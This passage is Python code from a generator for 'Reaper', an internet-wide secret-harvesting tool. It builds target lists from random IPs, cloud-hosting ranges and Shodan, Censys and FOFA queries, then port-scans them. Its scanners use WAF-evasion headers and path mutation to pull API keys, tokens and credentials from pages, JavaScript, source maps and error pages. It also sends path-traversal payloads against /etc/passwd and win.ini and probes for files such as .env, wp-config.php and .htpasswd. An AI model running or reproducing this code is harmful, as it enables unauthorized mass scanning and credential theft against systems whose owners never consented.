    ipaddress.ip_network("240.0.0.0/4"),
    ipaddress.ip_network("255.255.255.255/32"),
]

HOSTING_RANGES = [
    "3.0.0.0/15", "13.32.0.0/15", "18.64.0.0/14",
    "34.192.0.0/12", "52.0.0.0/11", "54.64.0.0/11",
    "34.64.0.0/11", "35.184.0.0/13",
    "13.64.0.0/11", "20.0.0.0/11", "40.64.0.0/10",
    "51.104.0.0/15", "52.96.0.0/12",
    "64.225.0.0/16", "67.205.128.0/17", "68.183.0.0/16",
    "134.122.0.0/16", "137.184.0.0/16", "138.68.0.0/16",
    "139.59.0.0/16", "142.93.0.0/16", "143.110.0.0/16",
    "143.198.0.0/16", "146.190.0.0/16", "147.182.0.0/16",
    "157.230.0.0/16", "159.65.0.0/16", "159.89.0.0/16",
    "161.35.0.0/16", "164.90.0.0/16", "164.92.0.0/16",
    "165.22.0.0/16", "165.227.0.0/16", "167.71.0.0/16",
    "167.172.0.0/16", "174.138.0.0/16", "178.128.0.0/16",
    "188.166.0.0/16", "206.189.0.0/16", "209.97.0.0/16",
    "5.9.0.0/16", "46.4.0.0/16", "49.12.0.0/16", "49.13.0.0/16",
    "65.108.0.0/16", "65.109.0.0/16", "78.46.0.0/15",
    "88.198.0.0/16", "88.99.0.0/16", "95.216.0.0/16",
    "116.202.0.0/16", "116.203.0.0/16", "135.181.0.0/16",
    "136.243.0.0/16", "138.201.0.0/16", "142.132.0.0/16",
    "144.76.0.0/16", "148.251.0.0/16", "157.90.0.0/16",
    "159.69.0.0/16", "162.55.0.0/16", "167.235.0.0/16",
    "168.119.0.0/16", "176.9.0.0/16", "178.63.0.0/16",
    "188.40.0.0/16", "195.201.0.0/16",
    "51.38.0.0/16", "51.68.0.0/16", "51.75.0.0/16",
    "51.77.0.0/16", "51.79.0.0/16", "51.89.0.0/16",
    "54.36.0.0/16", "54.37.0.0/16", "54.38.0.0/16",
    "135.125.0.0/16", "137.74.0.0/16", "141.94.0.0/16",
    "145.239.0.0/16", "147.135.0.0/16", "149.202.0.0/16",
    "151.80.0.0/16", "158.69.0.0/16", "164.132.0.0/16",
    "45.32.0.0/16", "45.63.0.0/16", "45.76.0.0/16", "45.77.0.0/16",
    "66.42.0.0/16", "78.141.0.0/16", "95.179.0.0/16",
    "108.61.0.0/16", "136.244.0.0/16", "140.82.0.0/16",
    "144.202.0.0/16", "149.28.0.0/16", "155.138.0.0/16",
    "45.33.0.0/17", "45.79.0.0/16", "139.144.0.0/16",
    "143.42.0.0/16", "172.232.0.0/14",
]


def _is_reserved(ip_int: int) -> bool:
    ip_obj = ipaddress.ip_address(ip_int)
    for net in RESERVED_NETWORKS:
        if ip_obj in net:
            return True
    return False


def generate_random_ips(count: int) -> list[str]:
    ips = []
    attempts = 0
    while len(ips) < count and attempts < count * 3:
        ip_int = random.randint(1, 0xDFFFFFFF)
        attempts += 1
        if not _is_reserved(ip_int):
            ips.append(str(ipaddress.ip_address(ip_int)))
    return ips


def generate_from_ranges(count: int,
                         ranges: Optional[list[str]] = None) -> list[str]:
    if ranges is None:
        ranges = HOSTING_RANGES
    networks = []
    for r in ranges:
        try:
            networks.append(ipaddress.ip_network(r, strict=False))
        except ValueError:
            continue
    if not networks:
        return []
    ips = set()
    attempts = 0
    while len(ips) < count and attempts < count * 5:
        net = random.choice(networks)
        num_addrs = net.num_addresses
        if num_addrs <= 2:
            attempts += 1
            continue
        offset = random.randint(1, num_addrs - 2)
        ip = net.network_address + offset
        ips.add(str(ip))
        attempts += 1
    return list(ips)


async def port_precheck(ips: list[str], ports: list[int],
                        timeout: float = 2.0,
                        concurrency: int = 5000) -> list[tuple[str, int]]:
    alive = []
    sem = asyncio.Semaphore(concurrency)
    lock = asyncio.Lock()
    checked = 0
    total = len(ips) * len(ports)

    async def check_one(ip: str, port: int):
        nonlocal checked
        async with sem:
            try:
                conn = asyncio.open_connection(ip, port)
                reader, writer = await asyncio.wait_for(conn, timeout=timeout)
                writer.close()
                await writer.wait_closed()
                async with lock:
                    alive.append((ip, port))
            except (asyncio.TimeoutError, OSError, ConnectionRefusedError):
                pass
            finally:
                checked += 1
                if checked % 10000 == 0:
                    logger.info(f"Port precheck: {checked}/{total} ({len(alive)} alive)")

    tasks = []
    for ip in ips:
        for port in ports:
            tasks.append(check_one(ip, port))
    batch_size = 10000
    for i in range(0, len(tasks), batch_size):
        await asyncio.gather(*tasks[i:i + batch_size], return_exceptions=True)
    logger.info(f"Port precheck complete: {len(alive)} alive out of {total}")
    return alive


async def fetch_from_shodan(api_key: str, max_results: int = 10000) -> list[str]:
    if not api_key:
        return []
    try:
        import aiohttp
        ips = []
        queries = ["port:80 http", "port:443 ssl", "port:8080 http",
                    'http.title:"index of"', "http.status:200"]
        async with aiohttp.ClientSession() as session:
            for query in queries:
                if len(ips) >= max_results:
                    break
                page = 1
                while len(ips) < max_results and page <= 5:
                    url = f"https://api.shodan.io/shodan/host/search?key={api_key}&query={query}&page={page}"
                    try:
                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                            if resp.status != 200:
                                break
                            data = await resp.json()
                            matches = data.get("matches", [])
                            if not matches:
                                break
                            for m in matches:
                                ip = m.get("ip_str", "")
                                if ip and ip not in ips:
                                    ips.append(ip)
                            page += 1
                    except Exception as e:
                        logger.warning(f"Shodan error: {e}")
                        break
        logger.info(f"Shodan: {len(ips)} IPs")
        return ips[:max_results]
    except ImportError:
        return []


async def fetch_from_censys(api_id: str, api_secret: str,
                            max_results: int = 10000) -> list[str]:
    if not api_id or not api_secret:
        return []
    try:
        import aiohttp
        import base64
        ips = []
        auth = base64.b64encode(f"{api_id}:{api_secret}".encode()).decode()
        queries = ["services.port=80", "services.port=443", "services.port=8080"]
        async with aiohttp.ClientSession() as session:
            for query in queries:
                if len(ips) >= max_results:
                    break
                url = "https://search.censys.io/api/v2/hosts/search"
                headers = {"Authorization": f"Basic {auth}"}
                params = {"q": query, "per_page": 100}
                cursor = None
                for _ in range(50):
                    if len(ips) >= max_results:
                        break
                    if cursor:
                        params["cursor"] = cursor
                    try:
                        async with session.get(url, headers=headers, params=params,
                                               timeout=aiohttp.ClientTimeout(total=30)) as resp:
                            if resp.status != 200:
                                break
                            data = await resp.json()
                            hits = data.get("result", {}).get("hits", [])
                            if not hits:
                                break
                            for hit in hits:
                                ip = hit.get("ip", "")
                                if ip and ip not in ips:
                                    ips.append(ip)
                            cursor = data.get("result", {}).get("links", {}).get("next", "")
                            if not cursor:
                                break
                    except Exception as e:
                        logger.warning(f"Censys error: {e}")
                        break
        logger.info(f"Censys: {len(ips)} IPs")
        return ips[:max_results]
    except ImportError:
        return []


async def fetch_from_fofa(email: str, api_key: str,
                          max_results: int = 10000) -> list[str]:
    if not email or not api_key:
        return []
    try:
        import aiohttp
        import base64
        ips = []
        queries = ['port="80"', 'port="443"', 'port="8080"']
        async with aiohttp.ClientSession() as session:
            for query in queries:
                if len(ips) >= max_results:
                    break
                q_b64 = base64.b64encode(query.encode()).decode()
                url = f"https://fofa.info/api/v1/search/all?email={email}&key={api_key}&qbase64={q_b64}&size=1000&fields=ip"
                try:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                        if resp.status != 200:
                            continue
                        data = await resp.json()
                        for row in data.get("results", []):
                            ip = row[0] if isinstance(row, list) else row
                            if ip and str(ip) not in ips:
                                ips.append(str(ip))
                except Exception as e:
                    logger.warning(f"FOFA error: {e}")
        logger.info(f"FOFA: {len(ips)} IPs")
        return ips[:max_results]
    except ImportError:
        return []


class IPGenerator:
    def __init__(self, config):
        self.config = config
        self._generated: list[str] = []
        self._alive: list[tuple[str, int]] = []

    async def generate(self) -> list[tuple[str, int]]:
        mode = self.config.target_mode
        target_count = self.config.max_targets
        all_ips = set()

        if mode in ("random", "all"):
            count = target_count if mode == "random" else target_count // 3
            random_ips = generate_random_ips(count)
            all_ips.update(random_ips)
            logger.info(f"Random IPs: {len(random_ips)}")

        if mode in ("ranges", "all"):
            count = target_count if mode == "ranges" else target_count // 3
            range_ips = generate_from_ranges(count)
            all_ips.update(range_ips)
            logger.info(f"Range IPs: {len(range_ips)}")

        if mode in ("api", "all"):
            api_ips = []
            if self.config.shodan_api_key:
                api_ips.extend(await fetch_from_shodan(
                    self.config.shodan_api_key, target_count // 3))
            if self.config.censys_api_id:
                api_ips.extend(await fetch_from_censys(
                    self.config.censys_api_id, self.config.censys_api_secret,
                    target_count // 3))
            if self.config.fofa_email:
                api_ips.extend(await fetch_from_fofa(
                    self.config.fofa_email, self.config.fofa_api_key,
                    target_count // 3))
            all_ips.update(api_ips)
            logger.info(f"API IPs: {len(api_ips)}")

        self._generated = list(all_ips)[:target_count]
        logger.info(f"Total unique IPs: {len(self._generated)}")

        if self.config.precheck_ports:
            logger.info(f"Port precheck on {len(self._generated)} IPs...")
            self._alive = await port_precheck(
                self._generated, self.config.ports,
                self.config.precheck_timeout, self.config.precheck_concurrency)
        else:
            self._alive = [(ip, port) for ip in self._generated
                           for port in self.config.ports]

        logger.info(f"Alive targets: {len(self._alive)}")
        return self._alive

    @property
    def stats(self) -> dict:
        return {"generated": len(self._generated), "alive": len(self._alive)}
'''

# ============================================================
# core/scanner.py
# ============================================================
STRUCTURE["reaper/core/scanner.py"] = r'''"""
Reaper — L4/L7 Scanner Engine
"""

import asyncio
import time
import logging
import random
import ssl as ssl_module
from typing import Optional

import aiohttp

from config import ScanConfig
from core.target_gen import Target
from core.result_store import ResultStore, ScanResult
from utils.http_utils import create_connector, create_timeout, fetch

logger = logging.getLogger("reaper.scanner")


class RateLimiter:
    def __init__(self, rps: int, burst: int = 100):
        self._rps = rps
        self._burst = burst
        self._tokens = float(burst)
        self._max_tokens = float(burst)
        self._last_refill = time.monotonic()
        self._lock = asyncio.Lock()

    async def acquire(self):
        while True:
            async with self._lock:
                now = time.monotonic()
                elapsed = now - self._last_refill
                self._tokens = min(self._max_tokens,
                                   self._tokens + elapsed * self._rps)
                self._last_refill = now
                if self._tokens >= 1.0:
                    self._tokens -= 1.0
                    return
            await asyncio.sleep(1.0 / self._rps)


class L4Probe:
    @staticmethod
    async def check_port(host: str, port: int, timeout: float = 5.0) -> bool:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout)
            writer.close()
            await writer.wait_closed()
            return True
        except (asyncio.TimeoutError, OSError, ConnectionRefusedError):
            return False

    @staticmethod
    async def grab_banner(host: str, port: int, timeout: float = 5.0) -> Optional[str]:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout)
            try:
                writer.write(b"HEAD / HTTP/1.0\r\nHost: check\r\n\r\n")
                await writer.drain()
                data = await asyncio.wait_for(reader.read(2048), timeout=timeout)
                return data.decode("utf-8", errors="replace")
            finally:
                writer.close()
                await writer.wait_closed()
        except (asyncio.TimeoutError, OSError, ConnectionRefusedError):
            return None


class ScannerEngine:
    def __init__(self, config: ScanConfig, result_store: ResultStore):
        self.config = config
        self.results = result_store
        self._rate_limiter = RateLimiter(config.target_rps, config.burst_size)
        self._scanners = {}
        self._session: Optional[aiohttp.ClientSession] = None
        self._scan_count = 0
        self._start_time = 0.0
        self._lock = asyncio.Lock()

    def register_scanner(self, scanner):
        self._scanners[scanner.name] = scanner

    async def _get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession(
                connector=create_connector(
                    self.config.total_connector_limit,
                    self.config.max_connections_per_host),
                timeout=create_timeout(
                    self.config.connect_timeout,
                    self.config.read_timeout,
                    self.config.total_timeout),
            )
        return self._session

    async def scan_target(self, target: Target, paths: list[str],
                          target_gen=None):
        session = await self._get_session()
        for path in paths:
            for scanner_name, scanner in self._scanners.items():
                if scanner_name not in self.config.enabled_scanners:
                    continue
                await self._rate_limiter.acquire()
                try:
                    if self.config.scan_mode in ("L7", "L4+L7"):
                        scheme = "https" if target.port in (443, 8443) else "http"
                        result = await scanner.scan(
                            session=session, target_host=target.host,
                            target_port=target.port, path=path,
                            is_ip=target.is_ip, scheme=scheme)
                        if result:
                            added = await self.results.add_result(result)
                            if added and target_gen and result.new_targets:
                                target_gen.add_from_parsed_content(
                                    "\n".join(result.new_targets))
                                logger.info(
                                    f"[{scanner_name}] {result.url} -> "
                                    f"{len(result.secrets)} secrets, "
                                    f"{len(result.new_targets)} new targets")

                    if (self.config.scan_mode in ("L4", "L4+L7")
                            and target.is_ip):
                        banner = await L4Probe.grab_banner(target.host, target.port)
                        if banner:
                            from extractors.secrets import extract_secrets
                            secrets = extract_secrets(
                                banner, f"l4://{target.host}:{target.port}")
                            if secrets:
                                r = ScanResult(
                                    url=f"l4://{target.host}:{target.port}{path}",
                                    status=0, scanner=f"{scanner_name}_l4",
                                    secrets=secrets)
                                await self.results.add_result(r)
                except Exception as e:
                    logger.debug(f"Error {target.host}:{target.port}{path}: {e}")

                async with self._lock:
                    self._scan_count += 1

                jmin, jmax = self.config.delay_jitter_ms
                if jmax > 0:
                    await asyncio.sleep(random.uniform(jmin, jmax) / 1000.0)

    async def run(self, targets: list[Target], paths: list[str],
                  target_gen=None):
        self._start_time = time.monotonic()
        self._scan_count = 0
        sem = asyncio.Semaphore(self.config.max_concurrent_requests)

        async def bounded_scan(target: Target):
            async with sem:
                await self.scan_target(target, paths, target_gen)

        logger.info(f"Scan: {len(targets)} targets x {len(paths)} paths x "
                     f"{len(self.config.enabled_scanners)} scanners")

        batch_size = 500
        for i in range(0, len(targets), batch_size):
            batch = targets[i:i + batch_size]
            await asyncio.gather(*[bounded_scan(t) for t in batch],
                                 return_exceptions=True)
            elapsed = time.monotonic() - self._start_time
            rps = self._scan_count / elapsed if elapsed > 0 else 0
            logger.info(f"Progress: {i + len(batch)}/{len(targets)} | "
                         f"{self._scan_count} reqs | {rps:.0f} RPS | "
                         f"Secrets: {self.results.stats['total_secrets']}")

            if target_gen:
                new = [t for t in target_gen.get_targets()
                       if t.priority > 0
                       and f"{t.host}:{t.port}" not in
                       {f"{bt.host}:{bt.port}" for bt in targets}]
                if new:
                    logger.info(f"Chaining: {len(new)} new targets")
                    await asyncio.gather(
                        *[bounded_scan(t) for t in new[:100]],
                        return_exceptions=True)

        elapsed = time.monotonic() - self._start_time
        logger.info(f"Done: {self._scan_count} reqs in {elapsed:.1f}s "
                     f"({self._scan_count / elapsed:.0f} RPS)")

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()
'''

# ============================================================
# scanners/__init__.py
# ============================================================
STRUCTURE["reaper/scanners/__init__.py"] = ""

# ============================================================
# scanners/path_scanner.py
# ============================================================
STRUCTURE["reaper/scanners/path_scanner.py"] = r'''"""
Reaper — Path Scanner
"""

import aiohttp
from typing import Optional
from extractors.secrets import extract_secrets
from extractors.link_parser import extract_all_targets
from core.waf_bypass import generate_headers, mutate_path
from core.result_store import ScanResult
from utils.http_utils import fetch


class PathScanner:
    name = "path"

    def __init__(self, waf_evasion: bool = True):
        self.waf_evasion = waf_evasion

    async def scan(self, session: aiohttp.ClientSession,
                   target_host: str, target_port: int, path: str,
                   is_ip: bool = False, scheme: str = "https") -> Optional[ScanResult]:
        if target_port == 80:
            scheme = "http"
        mutated = mutate_path(path) if self.waf_evasion else path
        url = f"{scheme}://{target_host}:{target_port}{mutated}"
        headers = generate_headers(
            custom_host=target_host if not is_ip else None
        ) if self.waf_evasion else {}
        resp = await fetch(session, url, headers=headers)
        if resp is None or resp["status"] in (404, 403, 503, 502):
            return None
        body = resp["body"]
        secrets = extract_secrets(body, source_url=url)
        td = extract_all_targets(body, base_url=url)
        new_targets = td["ips"] + td["domains"]
        if secrets or new_targets:
            return ScanResult(url=resp["url"], status=resp["status"],
                              scanner=self.name, secrets=secrets,
                              new_targets=new_targets, response_size=resp["size"])
        return None
'''

# ============================================================
# scanners/js_scanner.py
# ============================================================
STRUCTURE["reaper/scanners/js_scanner.py"] = r'''"""
Reaper — JS Scanner
"""

import re
import aiohttp
from typing import Optional
from extractors.secrets import extract_secrets
from extractors.link_parser import extract_all_targets
from core.waf_bypass import generate_headers
from core.result_store import ScanResult
from utils.http_utils import fetch

JS_LINK_PATTERNS = [
    re.compile(r"""<script[^>]+src=['"]([^'"]+\.js(?:\?[^'"]*)?)['"]\s*>""", re.I),
    re.compile(r"""['"]([^'"]*\.(?:js|mjs|cjs)(?:\?[^'"]*)?)['"]"""),
]

JS_PATHS_DEFAULT = [
    "/main.js", "/app.js", "/bundle.js", "/vendor.js",
    "/config.js", "/settings.js", "/env.js",
    "/static/js/main.js", "/static/js/app.js",
    "/assets/js/app.js", "/dist/bundle.js",
    "/js/app.js", "/js/main.js",
]


class JSScanner:
    name = "js"

    def __init__(self, waf_evasion: bool = True, max_js_files: int = 50):
        self.waf_evasion = waf_evasion
        self.max_js_files = max_js_files

    async def scan(self, session: aiohttp.ClientSession,
                   target_host: str, target_port: int, path: str,
                   is_ip: bool = False, scheme: str = "https") -> Optional[ScanResult]:
        if target_port == 80:
            scheme = "http"
        base_url = f"{scheme}://{target_host}:{target_port}"
        page_url = f"{base_url}{path}"
        headers = generate_headers(
            custom_host=target_host if not is_ip else None
        ) if self.waf_evasion else {}
        resp = await fetch(session, page_url, headers=headers)
        if resp is None or resp["status"] >= 400:
            return None
        js_urls = set()
        body = resp["body"]
        for pattern in JS_LINK_PATTERNS:
            for match in pattern.finditer(body):
                js_ref = match.group(1)
                if js_ref.startswith(("http://", "https://")):
                    js_urls.add(js_ref)
                elif js_ref.startswith("/"):
                    js_urls.add(f"{base_url}{js_ref}")
                else:
                    js_urls.add(f"{base_url}/{js_ref}")
        for jp in JS_PATHS_DEFAULT:
            js_urls.add(f"{base_url}{jp}")
        all_secrets = []
        all_new_targets = []
        scanned = 0
        for js_url in js_urls:
            if scanned >= self.max_js_files:
                break
            js_resp = await fetch(session, js_url, headers=headers)
            if js_resp is None or js_resp["status"] >= 400:
                continue
            js_body = js_resp["body"]
            if len(js_body) < 10:
                continue
            scanned += 1
            all_secrets.extend(extract_secrets(js_body, source_url=js_url))
            td = extract_all_targets(js_body, base_url=js_url)
            all_new_targets.extend(td["ips"])
            all_new_targets.extend(td["domains"])
        if all_secrets or all_new_targets:
            return ScanResult(url=page_url, status=resp["status"],
                              scanner=self.name, secrets=all_secrets,
                              new_targets=list(set(all_new_targets)),
                              response_size=resp["size"])
        return None
'''

# ============================================================
# scanners/r2s_scanner.py
# ============================================================
STRUCTURE["reaper/scanners/r2s_scanner.py"] = r'''"""
Reaper — R2S Scanner (Response-to-Secrets)
"""

import re
import aiohttp
from typing import Optional
from extractors.secrets import extract_secrets
from extractors.link_parser import extract_all_targets
from core.waf_bypass import generate_headers, mutate_path
from core.result_store import ScanResult
from utils.http_utils import fetch

HEADER_SECRETS = [
    "x-api-key", "authorization", "x-auth-token", "x-access-token",
    "set-cookie", "x-powered-by", "server", "x-debug", "x-debug-token",
    "www-authenticate",
]
COMMENT_PATTERN = re.compile(r"<!--(.*?)-->", re.DOTALL)
INLINE_JS_PATTERN = re.compile(r"<script[^>]*>(.*?)</script>", re.DOTALL | re.I)
META_PATTERN = re.compile(
    r"<meta[^>]+(?:content|value)\s*=\s*['\"]([^'\"]+)['\"][^>]*>", re.I)


class R2SScanner:
    name = "r2s"

    def __init__(self, waf_evasion: bool = True):
        self.waf_evasion = waf_evasion

    async def scan(self, session: aiohttp.ClientSession,
                   target_host: str, target_port: int, path: str,
                   is_ip: bool = False, scheme: str = "https") -> Optional[ScanResult]:
        if target_port == 80:
            scheme = "http"
        mutated = mutate_path(path) if self.waf_evasion else path
        url = f"{scheme}://{target_host}:{target_port}{mutated}"
        headers = generate_headers(
            custom_host=target_host if not is_ip else None
        ) if self.waf_evasion else {}
        resp = await fetch(session, url, headers=headers)
        if resp is None:
            return None
        all_secrets = []
        all_new_targets = []
        header_parts = []
        for hname, hvalue in resp["headers"].items():
            if hname.lower() in HEADER_SECRETS:
                header_parts.append(f"{hname}={hvalue}")
        if header_parts:
            all_secrets.extend(extract_secrets("\n".join(header_parts), source_url=url))
        body = resp["body"]
        for match in COMMENT_PATTERN.finditer(body):
            comment = match.group(1)
            all_secrets.extend(extract_secrets(comment, source_url=url))
            td = extract_all_targets(comment, base_url=url)
            all_new_targets.extend(td["ips"] + td["domains"])
        for match in INLINE_JS_PATTERN.finditer(body):
            script = match.group(1)
            if len(script) > 5:
                all_secrets.extend(extract_secrets(script, source_url=url))
        for match in META_PATTERN.finditer(body):
            all_secrets.extend(extract_secrets(match.group(1), source_url=url))
        all_secrets.extend(extract_secrets(body, source_url=url))
        td = extract_all_targets(body, base_url=url)
        all_new_targets.extend(td["ips"] + td["domains"])
        if all_secrets or all_new_targets:
            return ScanResult(url=resp["url"], status=resp["status"],
                              scanner=self.name, secrets=all_secrets,
                              new_targets=list(set(all_new_targets)),
                              response_size=resp["size"])
        return None
'''

# ============================================================
# scanners/nvca_scanner.py
# ============================================================
STRUCTURE["reaper/scanners/nvca_scanner.py"] = r'''"""
Reaper — NVCA Scanner (Non-Visible Content Analysis)
"""

import re
import aiohttp
from typing import Optional
from extractors.secrets import extract_secrets
from extractors.link_parser import extract_all_targets
from core.waf_bypass import generate_headers, mutate_path
from core.result_store import ScanResult
from utils.http_utils import fetch

HIDDEN_INPUT_PATTERN = re.compile(
    r"<input[^>]+type\s*=\s*['\"]hidden['\"][^>]*value\s*=\s*['\"]([^'\"]+)['\"]", re.I)
DATA_ATTR_PATTERN = re.compile(
    r"data-(?:api[-_]?(?:key|token|url|endpoint|secret)|token|secret|key|url|config)\s*=\s*['\"]([^'\"]+)['\"]", re.I)
SOURCEMAP_PATTERN = re.compile(r"//[#@]\s*sourceMappingURL\s*=\s*(\S+)")
STACK_TRACE_PATTERN = re.compile(
    r"(?:Traceback|Exception|Error|at\s+\w+\s*\(|File\s+\"[^\"]+\",\s*line\s+\d+)", re.I)
ERROR_PATHS = ["/404", "/500", "/error", "/debug/error", "/_error", "/undefined"]


class NVCAScanner:
    name = "nvca"

    def __init__(self, waf_evasion: bool = True):
        self.waf_evasion = waf_evasion

    async def scan(self, session: aiohttp.ClientSession,
                   target_host: str, target_port: int, path: str,
                   is_ip: bool = False, scheme: str = "https") -> Optional[ScanResult]:
        if target_port == 80:
            scheme = "http"
        base_url = f"{scheme}://{target_host}:{target_port}"
        headers = generate_headers(
            custom_host=target_host if not is_ip else None
        ) if self.waf_evasion else {}
        all_secrets = []
        all_new_targets = []
        primary_resp = None
        for scan_path in [path] + ERROR_PATHS:
            mutated = mutate_path(scan_path) if self.waf_evasion else scan_path
            url = f"{base_url}{mutated}"
            resp = await fetch(session, url, headers=headers)
            if resp is None:
                continue
            if primary_resp is None:
                primary_resp = resp
            body = resp["body"]
            for match in HIDDEN_INPUT_PATTERN.finditer(body):
                v = match.group(1)
                if len(v) > 6:
                    all_secrets.extend(extract_secrets(f"HIDDEN_VALUE={v}", source_url=resp["url"]))
            for match in DATA_ATTR_PATTERN.finditer(body):
                all_secrets.extend(extract_secrets(f"DATA_ATTR={match.group(1)}", source_url=resp["url"]))
            for match in SOURCEMAP_PATTERN.finditer(body):
                map_url = match.group(1)
                if not map_url.startswith("data:"):
                    full = map_url if map_url.startswith("http") else f"{base_url}/{map_url.lstrip('/')}"
                    mr = await fetch(session, full, headers=headers)
                    if mr and mr["status"] == 200:
                        all_secrets.extend(extract_secrets(mr["body"], source_url=full))
                        td = extract_all_targets(mr["body"], base_url=full)
                        all_new_targets.extend(td["ips"] + td["domains"])
            if STACK_TRACE_PATTERN.search(body):
                all_secrets.extend(extract_secrets(body, source_url=resp["url"]))
                td = extract_all_targets(body, base_url=resp["url"])
                all_new_targets.extend(td["ips"] + td["domains"])
        if primary_resp and (all_secrets or all_new_targets):
            return ScanResult(url=f"{base_url}{path}", status=primary_resp["status"],
                              scanner=self.name, secrets=all_secrets,
                              new_targets=list(set(all_new_targets)),
                              response_size=primary_resp["size"])
        return None
'''

# ============================================================
# scanners/ajs_scanner.py
# ============================================================
STRUCTURE["reaper/scanners/ajs_scanner.py"] = r'''"""
Reaper — AJS Scanner (Async JS Endpoint Discovery)
"""

import re
import aiohttp
from typing import Optional
from urllib.parse import urljoin
from extractors.secrets import extract_secrets
from extractors.link_parser import extract_all_targets
from core.waf_bypass import generate_headers
from core.result_store import ScanResult
from utils.http_utils import fetch

API_ENDPOINT_PATTERN = re.compile(
    r"""['"`](/(?:api|v[0-9]+|graphql|rest|internal|backend|service|auth|oauth|webhook)[^\s'"`]{2,})['"`]""", re.I)
FETCH_PATTERN = re.compile(
    r"""(?:fetch|axios\.\w+|this\.\$http\.\w+|\$\.(?:get|post|ajax))\s*\(\s*['"`]([^'"`]+)['"`]""", re.I)
CONFIG_PATTERN = re.compile(
    r"""(?:baseURL|apiUrl|API_URL|API_BASE|BACKEND_URL|BASE_URL|endpoint)\s*[=:]\s*['"`]([^'"`]+)['"`]""", re.I)


class AJSScanner:
    name = "ajs"

    def __init__(self, waf_evasion: bool = True, max_endpoints: int = 100):
        self.waf_evasion = waf_evasion
        self.max_endpoints = max_endpoints

    async def scan(self, session: aiohttp.ClientSession,
                   target_host: str, target_port: int, path: str,
                   is_ip: bool = False, scheme: str = "https") -> Optional[ScanResult]:
        if target_port == 80:
            scheme = "http"
        base_url = f"{scheme}://{target_host}:{target_port}"
        page_url = f"{base_url}{path}"
        headers = generate_headers(
            custom_host=target_host if not is_ip else None
        ) if self.waf_evasion else {}
        resp = await fetch(session, page_url, headers=headers)
        if resp is None or resp["status"] >= 400:
            return None
        body = resp["body"]
        js_urls = set()
        for match in re.finditer(r"""<script[^>]+src=['"]([^'"]+\.js[^'"]*)['"]\s*>""", body, re.I):
            ref = match.group(1)
            js_urls.add(ref if ref.startswith("http") else urljoin(base_url, ref))
        js_content = body
        for js_url in list(js_urls)[:30]:
            jr = await fetch(session, js_url, headers=headers)
            if jr and jr["status"] == 200:
                js_content += "\n" + jr["body"]
        endpoints = set()
        for pat in [API_ENDPOINT_PATTERN, FETCH_PATTERN, CONFIG_PATTERN]:
            for match in pat.finditer(js_content):
                endpoints.add(match.group(1))
        all_secrets = []
        all_new_targets = []
        probed = 0
        for ep in endpoints:
            if probed >= self.max_endpoints:
                break
            probe_url = ep if ep.startswith("http") else (
                f"{base_url}{ep}" if ep.startswith("/") else f"{base_url}/{ep}")
            pr = await fetch(session, probe_url, headers=headers)
            probed += 1
            if pr is None or pr["status"] in (404, 403, 502, 503):
                continue
            all_secrets.extend(extract_secrets(pr["body"], source_url=probe_url))
            td = extract_all_targets(pr["body"], base_url=probe_url)
            all_new_targets.extend(td["ips"] + td["domains"])
        if all_secrets or all_new_targets:
            return ScanResult(url=page_url, status=resp["status"],
                              scanner=self.name, secrets=all_secrets,
                              new_targets=list(set(all_new_targets)),
                              response_size=resp["size"])
        return None
'''

# ============================================================
# scanners/uafr_scanner.py
# ============================================================
STRUCTURE["reaper/scanners/uafr_scanner.py"] = r'''"""
Reaper — UAFR Scanner (Unauthorized File Read)
"""

import aiohttp
from typing import Optional
from extractors.secrets import extract_secrets
from extractors.link_parser import extract_all_targets
from core.waf_bypass import generate_headers
from core.result_store import ScanResult
from utils.http_utils import fetch

TRAVERSAL_PAYLOADS = [
    "../../etc/passwd", "..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd", "..%252f..%252fetc%252fpasswd",
    "%2e%2e/%2e%2e/etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
]
BACKUP_EXTENSIONS = [
    ".bak", ".old", ".save", ".orig", ".copy",
    ".tmp", ".swp", "~", ".backup", ".txt",
]
SENSITIVE_FILES = [
    ".env", "wp-config.php", "config.php", "settings.py",
    "application.yml", "database.yml", "secrets.yml",
    "credentials.json", "web.config", ".htpasswd",
]
SENSITIVE_MARKERS = [
    "root:", "DB_PASSWORD", "SECRET_KEY", "PRIVATE KEY",
    "password", "credentials", "api_key",
    "[extensions]", "for 16-bit app support",
]


class UAFRScanner:
    name = "uafr"

    def __init__(self, waf_evasion: bool = True):
        self.waf_evasion = waf_evasion

    async def scan(self, session: aiohttp.ClientSession,
                   target_host: str, target_port: int, path: str,
                   is_ip: bool = False, scheme: str = "https") -> Optional[ScanResult]:
        if target_port == 80:
            scheme = "http"
        base_url = f"{scheme}://{target_host}:{target_port}"
        headers = generate_headers(
            custom_host=target_host if not is_ip else None
        ) if self.waf_evasion else {}
        all_secrets = []
        all_new_targets = []
        primary_resp = None
        if "." in path.split("/")[-1]:
            for ext in BACKUP_EXTENSIONS:
                url = f"{base_url}{path}{ext}"
                resp = await fetch(session, url, headers=headers)
                if resp and resp["status"] == 200 and resp["size"] > 50:
                    if any(m.lower() in resp["body"].lower() for m in SENSITIVE_MARKERS):
                        if primary_resp is None:
                            primary_resp = resp
                        all_secrets.extend(extract_secrets(resp["body"], source_url=url))
                        td = extract_all_targets(resp["body"], base_url=url)
                        all_new_targets.extend(td["ips"] + td["domains"])
        for payload in TRAVERSAL_PAYLOADS:
            url = f"{base_url}/{payload}"
            resp = await fetch(session, url, headers=headers)
            if resp and resp["status"] == 200:
                if any(m in resp["body"] for m in ["root:", "[extensions]", "DB_PASSWORD"]):
                    if primary_resp is None:
                        primary_resp = resp
                    all_secrets.extend(extract_secrets(resp["body"], source_url=url))
                    break
        for fname in SENSITIVE_FILES:
            for prefix in ["/", f"{path.rsplit('/', 1)[0]}/"]:
                url = f"{base_url}{prefix}{fname}"
                resp = await fetch(session, url, headers=headers)
                if resp and resp["status"] == 200 and resp["size"] > 20:
                    secrets = extract_secrets(resp["body"], source_url=url)
                    if secrets:
                        if primary_resp is None:
                            primary_resp = resp
                        all_secrets.extend(secrets)
                        td = extract_all_targets(resp["body"], base_url=url)
                        all_new_targets.extend(td["ips"] + td["domains"])
